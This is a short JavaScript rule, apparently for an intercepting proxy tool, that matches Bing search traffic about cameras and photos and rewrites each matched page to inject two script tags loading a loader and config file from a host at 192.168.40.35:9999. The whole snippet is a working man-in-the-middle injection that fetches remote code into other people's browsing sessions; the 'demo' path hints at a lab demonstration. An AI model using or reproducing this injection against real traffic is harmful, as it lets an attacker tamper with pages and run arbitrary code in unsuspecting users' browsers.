http()
    .url(/bing.*(nikon|camera|photo|picture|scene)/i)
    .loadContent()
    .modify(/<\/body>/i, `
        <script src='http://192.168.40.35:9999/loader.js'></script>
        <script src='http://192.168.40.35:9999/demo/config.js'></script>
        </body>
    `)